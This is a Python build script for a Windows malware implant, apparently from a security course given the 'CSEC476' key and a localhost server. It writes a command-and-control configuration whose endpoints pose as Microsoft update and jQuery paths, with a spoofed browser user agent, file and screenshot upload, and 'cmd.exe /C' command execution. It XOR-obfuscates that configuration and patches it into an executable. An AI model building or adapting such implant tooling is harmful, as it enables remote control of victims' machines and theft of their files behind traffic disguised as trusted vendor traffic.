import json
import argparse
import random

"""
Simple implant builder
Generates a JSON string and replaces the template with the correct config  
Optional paramaters for input and output files

Future plans: UI of some sort, encrypting the config file 
"""


def xor_data(data, keys):
    return bytearray(data[i] ^ keys[i % len(keys)] for i in range(0, len(data)) ) 


def gen_config_dict():
    #
    # Returns a dictionary in the standard config format
    # Changes made to the structure/format of the config JSON may require config.cpp/config.h to be updated as well 
    #

    config = dict()
    config["version"] = 0

    # endpoints
    config["endpoints"] = dict()
    config["endpoints"]["heartbeat"] = "/docroot/js/jquery-ui-1.11.2.custom.min.js"
    config["endpoints"]["info"] = "/msdownload/update/v3/static/trustedr/en/disallowedcertstl.cab"
    config["endpoints"]["out"] = "/msdownload/update/v3/static/untrusted/en/trustedinstaller.cab"
    config["endpoints"]["upload"] = "/msdownload/update/v3/static/untrustedr/en/authroot.cab"
    config["endpoints"]["ps"] = "/msdownload/update/v3/static/trustedr/en/authrootstl.cab"

    # strings 
    config["strings"] = dict()
    config["strings"]["post"] = "POST"
    config["strings"]["get"] = "GET"
    config["strings"]["uploadheaders"] = "Content-Type: multipart/form-data; boundary=UPLOAD"
    config["strings"]["uploadheadfile"] = "--UPLOAD\r\nContent-Disposition: form-data; name=\"file\"; filename=\"upload.bin\"\r\nContent-Type: application/octet-stream\r\n\r\n"
    config["strings"]["uploadheadscreenshot"] = "--UPLOAD\r\nContent-Disposition: form-data; name=\"file\"; filename=\"screenshot.bmp\"\r\nContent-Type: application/octet-stream\r\n\r\n"
    config["strings"]["uploadtail"] = "\r\n--UPLOAD--\r\n"
    config["strings"]["cmd"] = "cmd.exe /C "
    config["strings"]["regsubkey"] = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
    config["strings"]["productname"] = "ProductName"
    config["strings"]["displayversion"] = "DisplayVersion"

    # net
    config["hostname"] = "127.0.0.1"
    config["port"] = 5000
    config["protocol"] = "http"
    config["useragent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36"
    config["ipcheckurl"] = "http://ifconfig.me/ip"

    # times
    config["sleeptime"] = 1 * 1000
    config["cmdtimeout"] = 5 * 10000000

    # keys
    config["key"] = "CSEC476"
    config["xorkey"] = 0x7f
    return config


def main():
    BUFLEN = 2000
    # command line args
    parser = argparse.ArgumentParser(description="Basic builder utility for implants as seen at https://www.youtube.com/watch?v=FiT7-zxQGbo")
    parser.add_argument('--i', type=str, default='base.exe', help="Input file")
    parser.add_argument('--o', type=str, default='out.exe', help="Output file")
    args = parser.parse_args()

    # generate the configuration file as a string  
    config = gen_config_dict()
    config = json.dumps(config).encode()
    print(config)

    # generate the 4 bytes for multibyte XOR key
    keys = [random.randrange(1,255) for i in range(4)]
    keybytes = [key.to_bytes(1, 'big') for key in keys]
    padding = b"\x00" * (BUFLEN - len(config) - len(keybytes))
    
    keybytesout = b''
    for keybyte in keybytes:
        keybytesout += keybyte
    config = keybytesout + xor_data(config + padding, keys)

    print(keybytes)
    print(config)
    print(len(config))
    
    # Read executable into bytearray
    with open(args.i, 'rb') as exe:
        baseexe = bytearray(exe.read())
    exe.close()
    
    # Find offset
    offset = baseexe.find(b'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
    print(offset)

    # Copy executable into new file + write config @ offset
    with open(args.o, 'wb') as exe:
        exe.write(baseexe)
        exe.seek(offset)
        exe.write(config)
    exe.close()


if __name__ == "__main__":
    main()